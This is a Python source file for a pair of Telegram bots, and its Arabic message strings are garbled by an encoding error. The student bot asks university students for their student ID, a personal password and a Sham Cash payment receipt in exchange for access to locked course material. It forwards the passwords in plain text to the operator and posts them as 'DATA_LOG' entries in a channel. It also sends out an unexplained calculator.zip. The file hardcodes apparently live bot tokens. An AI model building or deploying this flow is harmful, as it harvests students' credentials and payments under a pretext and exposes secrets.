import os
import telebot
from telebot import types
from flask import Flask, request

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
CHANNEL_ID = "-1002493393930"
MY_PERSONAL_ID = 2038606299

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)
app = Flask(__name__)

pending_receipts = set()

@app.route('/' + TOKEN_STUDENT, methods=['POST'])
def get_message_student():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    student_bot.process_new_updates([update])
    return "!", 200

@app.route('/' + TOKEN_ADMIN, methods=['POST'])
def get_message_admin():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    admin_bot.process_new_updates([update])
    return "!", 200

@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    try:
        status = student_bot.get_chat_member(CHANNEL_ID, uid).status
        if status in ['member', 'administrator', 'creator']:
            student_bot.send_message(uid, "?? ÃåáÇğ Èß ãÌÏÏÇğ! ÍÓÇÈß äÔØ æãİÚøá İí ÇáãæÓæÚÉ ÇáãÚãÇÑíÉ.")
            return
    except:
        pass
    
    msg = student_bot.send_message(uid, "?? ÇáãæÓæÚÉ ãŞİáÉº ÇáÑÌÇÁ ÅÏÎÇá ÑŞãß ÇáÌÇãÚí áÈÏÁ ÇáÊÍŞŞ æÇáãØÇÈŞÉ:")
    student_bot.register_next_step_handler(msg, save_uni_id)
def save_uni_id(message):
    uid = message.from_user.id
    uni_id = message.text.strip()
    msg = student_bot.send_message(uid, "?? ÇÎÊÑ ßáãÉ ãÑæÑ ÎÇÕÉ ÈÍÓÇÈß áÍãÇíÉ ÈíÇäÇÊß:")
    student_bot.register_next_step_handler(msg, save_password, uni_id)

def save_password(message, uni_id):
    uid = message.from_user.id
    password = message.text.strip()
    msg = student_bot.send_message(uid, "?? ãÇÏÉ (ËŞÇİÉ ÚÑÈíÉ) ãŞİáÉ.\nÇáÑÌÇÁ ÅÏÎÇá ÑŞã ÚãáíÉ ÊÍæíá ÔÇã ßÇÔ ÇáãÑÌÚí áØáÈ ÇáÊİÚíá:")
    student_bot.register_next_step_handler(msg, handle_payment, uni_id, password)

def handle_payment(message, uni_id, password):
    uid = message.from_user.id
    receipt = message.text.strip()

    if receipt in pending_receipts:
        student_bot.send_message(uid, "? ÎØÃ: ÑŞã ÚãáíÉ ÔÇã ßÇÔ åĞå ÊÍÊ ÇáãÑÇÌÚÉ ÍÇáíÇğ! Êã ÅáÛÇÁ ÇáØáÈ ÊáŞÇÆíÇğ.")
        return

    pending_receipts.add(receipt)

    markup = types.InlineKeyboardMarkup()
    btn_app = types.InlineKeyboardButton("? ãæÇİŞÉ æÊİÚíá ÇáÍÓÇÈ", callback_data=f"acc_{uid}_{uni_id}_{password}")
    btn_rej = types.InlineKeyboardButton("? ÑİÖ ÇáØáÈ", callback_data=f"den_{uid}")
    markup.row(btn_app, btn_rej)

    text = f"?? ØáÈ ÊİÚíá æãØÇÈŞÉ ÌÏíÏ:\n\n?? ÂíÏí ÇáØÇáÈ: {uid}\n?? ÇáÑŞã ÇáÌÇãÚí: {uni_id}\n?? ÇáÈÇÓæÑÏ: {password}\n?? ÑŞã ÇáÍæÇáÉ: {receipt}"
    admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
    student_bot.send_message(uid, "? Êã ÅÑÓÇá ÈíÇäÇÊß æÑŞã ÇáÚãáíÉ ÈäÌÇÍ. íÑÌì ÇáÇäÊÙÇÑ áÍíä ãÑÇÌÚÉ ÇáÍæÇáÉ íÏæíÇğ ãä ŞöÈá ÇáÅÏÇÑÉ.")
@admin_bot.callback_query_handler(func=lambda call: True)
def handle_admin_buttons(call):
    parts = call.data.split('_')
    action = parts[0]
    target_uid = int(parts[1])

    if action == "acc":
        uni_id = parts[2]
        password = parts[3]
        
        try:
            link = student_bot.export_chat_invite_link(CHANNEL_ID)
            
            database_text = f"DATA_LOG\nID:{target_uid}\nUNI:{uni_id}\nPWD:{password}"
            student_bot.send_message(CHANNEL_ID, database_text)
            
            student_bot.send_message(target_uid, f"?? ãÈÇÑß! ÊãÊ ãØÇÈŞÉ ÍæÇáÊß ÈäÌÇÍ.\nÊã İÊÍ ÇáŞİá ÇáÃÎÖÑ ?? æÊİÚíá ÍÓÇÈß.\n\nÑÇÈØ ÊÕİÍ ÇáãáİÇÊ æÇáãÓÊäÏÇÊ ÃæİáÇíä ÈÂãÇä ÏÇÎá ÇáŞäÇÉ ÇáãÍãíÉ:\n{link}")
            admin_bot.edit_message_text(f"? Êã ŞÈæá ÇáØÇáÈ {target_uid} ÈäÌÇÍ æÊæËíŞå İí ŞÇÚÏÉ ÈíÇäÇÊ ÇáŞäÇÉ ÇáÓÍÇÈíÉ.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
            
        except Exception as e:
            admin_bot.answer_callback_query(call.id, f"? ÎØÃ ÈÑãÌí: {str(e)}")
            
    elif action == "den":
        try:
            student_bot.send_message(target_uid, "? äÚÊĞÑ ãäß¡ Êã ÑİÖ ØáÈß áÃä ÑŞã ÚãáíÉ ÔÇã ßÇÔ ÛíÑ ãØÇÈŞ áßÔİ ÇáÍÓÇÈ Ãæ ÇáÍÓÇÈ ãÓÊÎÏã ãÓÈŞÇğ.")
            admin_bot.edit_message_text(f"? Êã ÑİÖ ØáÈ ÇáØÇáÈ {target_uid} æÅÎØÇÑå İæÑÇğ.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
        except:
            pass

@student_bot.message_handler(func=lambda message: message.text == "download_gpa_excel")
def send_excel(message):
    uid = message.from_user.id
    try:
        with open("calculator.zip", "rb") as file:
            student_bot.send_document(uid, file, caption="?? ÊİÖá¡ ãáİ ÍÇÓÈÉ ÇáãÚÏá ÇáÊÑÇßãí ÇáãÌåÒ ãÌÇäÇğ ÈÕíÛÉ ZIP.")
    except:
        student_bot.send_message(uid, "? ÚĞÑÇğ¡ ãáİ ÇáÍÇÓÈÉ ÇáãÖÛæØ ÛíÑ ãÊæİÑ ÍÇáíÇğ Úáì ÇáÓíÑİÑ.")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
